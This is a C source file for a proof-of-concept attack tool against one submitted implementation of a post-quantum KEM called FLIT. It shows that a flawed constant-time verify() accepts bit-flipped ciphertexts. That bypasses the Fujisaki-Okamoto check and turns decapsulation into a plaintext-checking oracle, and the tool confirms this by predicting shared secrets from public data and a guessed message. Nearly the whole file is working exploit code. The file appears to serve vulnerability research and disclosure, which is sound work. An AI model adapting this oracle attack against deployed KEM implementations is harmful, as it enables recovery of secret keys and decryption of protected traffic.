/* flit_fo_tool.c — FLIT (kem-15) optimized verify() FO-bypass PoC.
 *
 * Compiled against one submitted FLIT implementation tree (all of the tree's
 * *.c except KAT_KEM.c, plus any *.S and keccak4x/*.c). Links the tree's own
 * crypto_kem_*, indcpa_dec, verify, cmov and hash macros. The submission is
 * never modified; run_all.sh copies trees into work/ and builds there.
 *
 * Modes:
 *   honest              keygen/enc/dec round-trip (sanity).
 *   acc    [N]          accept rate of verify() on mauled ciphertexts:
 *                        - N random 1-4 bit flips of a valid ct (default 200000),
 *                        - exhaustive single-bit flips of a fixed buffer.
 *                       Counts how many DIFFERING ciphertexts verify() calls EQUAL.
 *   ct                  verify()/cmov micro-behaviour on crafted inputs.
 *   pco    [M]          plaintext-checking oracle: find M invalid ciphertexts
 *                       that verify() accepts, and show the decapsulation output
 *                       equals KDF(G(m'||H(pk))||H(ct)) recomputed from public
 *                       data + the decrypted message m' (correct m' matches,
 *                       a wrong m' does not).
 */
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "params.h"
#include "symmetric.h"
#include "indcpa.h"
#include "kem.h"
#include "verify.h"
#include "drng.h"

/* The KAT harness normally defines and seeds this; the tool provides it and
 * seeds it from /dev/urandom, as a correct integrator would. */
DRNG_ctx drng_algorithm;
static void seed_drng(void){
    uint8_t s[48];
    FILE *f = fopen("/dev/urandom","rb");
    if (!f || fread(s,1,48,f)!=48){ memset(s,0x5A,48); }
    if (f) fclose(f);
    init_random_number(&drng_algorithm, s, 48);
}

static void hx(const char *t, const uint8_t *p, int n){
    printf("%s", t); for (int i=0;i<n;i++) printf("%02X", p[i]); printf("\n");
}
static int eq(const uint8_t *a, const uint8_t *b, int n){ return !memcmp(a,b,n); }

/* Attacker-side predictor of the ACCEPT-path shared secret, from public data
 * (pk, ct) and a guess of the decrypted message m'. Uses the tree's own hashes. */
static void predict(uint8_t ss[SEEDBYTES], const uint8_t *mguess,
                    const uint8_t *pk, const uint8_t *ct){
    uint8_t buf[2*SEEDBYTES], kr[2*SEEDBYTES];
    memcpy(buf, mguess, SEEDBYTES);
    hash_h(buf+SEEDBYTES, pk, KEM_PUBLICKEYBYTES);    /* H(pk): public */
    hash_g(kr, buf, 2*SEEDBYTES);                     /* G(m||H(pk)) */
    hash_h(kr+SEEDBYTES, ct, KEM_CIPHERTEXTBYTES);    /* H(ct): public */
    kdf(ss, kr, 2*SEEDBYTES);
}

static int mode_honest(void){
    static uint8_t pk[8192], sk[16384], ct[8192], ss[64], ss2[64];
    crypto_kem_keypair(pk, sk);
    crypto_kem_enc(ct, ss, pk);
    crypto_kem_dec(ss2, ct, sk);
    printf("honest keygen/enc/dec round-trip: %s (ct=%d bytes)\n",
           eq(ss, ss2, KEM_MSGBYTES) ? "ok" : "MISMATCH", KEM_CIPHERTEXTBYTES);
    return !eq(ss, ss2, KEM_MSGBYTES);
}

static int mode_acc(long NTRIAL){
    size_t L = KEM_CIPHERTEXTBYTES;
    uint8_t *a = malloc(L), *b = malloc(L);
    long acc=0, rej=0;
    srand(42);
    for (long t=0; t<NTRIAL; t++){
        for (size_t i=0;i<L;i++){ a[i]=rand(); b[i]=a[i]; }
        int k = 1 + (rand()%4);
        for (int j=0;j<k;j++){ size_t p=rand()%L; b[p]^=1u<<(rand()%8); }
        if (eq(a,b,L)) continue;
        (verify(a,b,L)==0) ? acc++ : rej++;         /* verify()==0 means "equal" */
    }
    printf("  random 1-4 bit flips (%ld differing ct): verify() called EQUAL %ld, NOT-equal %ld -> accept rate %.4f%%\n",
           acc+rej, acc, rej, 100.0*acc/(acc+rej));
    acc=0; rej=0; memset(a,0xA5,L);
    for (size_t p=0;p<L;p++) for (int bit=0;bit<8;bit++){
        memcpy(b,a,L); b[p]^=1u<<bit;
        (verify(a,b,L)==0) ? acc++ : rej++;
    }
    printf("  exhaustive single-bit flips (%zu): called EQUAL %ld, NOT-equal %ld\n", L*8, acc, rej);
    free(a); free(b);
    return 0;
}

static int mode_ct(void){
    int v;
    size_t L = KEM_CIPHERTEXTBYTES;
    uint8_t *a = calloc(L,1), *b = calloc(L,1);
    v = verify(a,b,L); printf("  verify(equal)          = %d (expect 0)\n", v);
    b[7] ^= 0x80;    v = verify(a,b,L); printf("  verify(differ@byte7b7) = %d\n", v);
    memset(b,0,L); b[100] ^= 1; v = verify(a,b,L); printf("  verify(differ@byte100) = %d  (mismatch return value)\n", v);
    uint8_t r[32], x[32];
    memset(r,0xAA,32); memset(x,0x55,32);
    cmov(r, x, 32, (uint8_t)verify(a,b,L));
    hx("  cmov(r=AA.., x=55.., b=verify-mismatch): r -> ", r, 8);
    printf("  (full move would give 55.., bit-0-only move gives AB..)\n");
    free(a); free(b);
    return 0;
}

static int mode_pco(long M){
    static uint8_t pk[8192], sk[16384], ct[8192], ss[64];
    crypto_kem_keypair(pk, sk);
    crypto_kem_enc(ct, ss, pk);                      /* a valid ct we will maul */
    static uint8_t ctm[8192], ssd[64], mprime[64], mwrong[64], pred[64], predw[64];
    long accepted=0, tested=0;
    srand(999);
    for (long t=0; t<20000000 && accepted<M; t++){
        memcpy(ctm, ct, KEM_CIPHERTEXTBYTES);
        int k = 1 + rand()%3;
        for (int j=0;j<k;j++){ int p=rand()%KEM_CIPHERTEXTBYTES; ctm[p]^=1u<<(rand()%8); }
        if (eq(ctm, ct, KEM_CIPHERTEXTBYTES)) continue;
        tested++;
        crypto_kem_dec(ssd, ctm, sk);                /* victim decapsulation = the oracle */
        indcpa_dec(mprime, ctm, sk);                 /* ground-truth m' the attacker learns */
        predict(pred, mprime, pk, ctm);              /* attacker's correct guess */
        memcpy(mwrong, mprime, SEEDBYTES); mwrong[0]^=1;
        predict(predw, mwrong, pk, ctm);             /* a wrong guess */
        if (eq(ssd, pred, KEM_MSGBYTES)){
            accepted++;
            printf("  accepted invalid ct' #%ld (%d bit-flips): oracle == predict(correct m'): YES ; == predict(wrong m'): %s\n",
                   accepted, k, eq(ssd,predw,KEM_MSGBYTES) ? "yes(!)" : "NO");
            if (accepted==1){ hx("     oracle ss        = ", ssd, 16);
                              hx("     predict(m')      = ", pred, 16);
                              hx("     predict(m' xor 1)= ", predw, 16); }
        }
    }
    printf("  summary: tested %ld invalid ct', verify() ACCEPTED %ld (FO bypass).\n", tested, accepted);
    printf("  On every accepted ct' the decapsulation output is reproducible from (pk, ct', m') alone\n");
    printf("  via the scheme's own G/H/KDF => plaintext-checking oracle.\n");
    return accepted ? 0 : 1;
}

int main(int argc, char **argv){
    const char *m = argc>1 ? argv[1] : "honest";
    seed_drng();
    if (!strcmp(m,"honest")) return mode_honest();
    if (!strcmp(m,"acc"))    return mode_acc(argc>2 ? atol(argv[2]) : 200000);
    if (!strcmp(m,"ct"))     return mode_ct();
    if (!strcmp(m,"pco"))    return mode_pco(argc>2 ? atol(argv[2]) : 5);
    fprintf(stderr, "unknown mode %s\n", m);
    return 2;
}
